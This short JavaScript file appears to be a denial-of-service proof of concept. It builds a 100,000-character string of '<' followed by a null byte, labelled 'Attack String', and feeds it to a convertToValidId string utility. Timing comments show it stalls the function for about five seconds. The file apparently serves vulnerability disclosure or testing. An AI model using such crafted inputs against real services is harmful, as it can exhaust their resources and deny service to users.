"use strict";

var _stringUtils = _interopRequireDefault(require("./stringUtils.js"));
function _interopRequireDefault(e) { return e && e.__esModule ? e : { "default": e }; }
//Attack String :""+"<"*100000+"\u0000"
var str = "";
for (var i = 0; i < 100000; i++) {
  str += "<";
}
str += "\0";
console.log(_stringUtils["default"].convertToValidId(str));

// real    0m5.217s
// user    0m5.199s
// sys     0m0.000s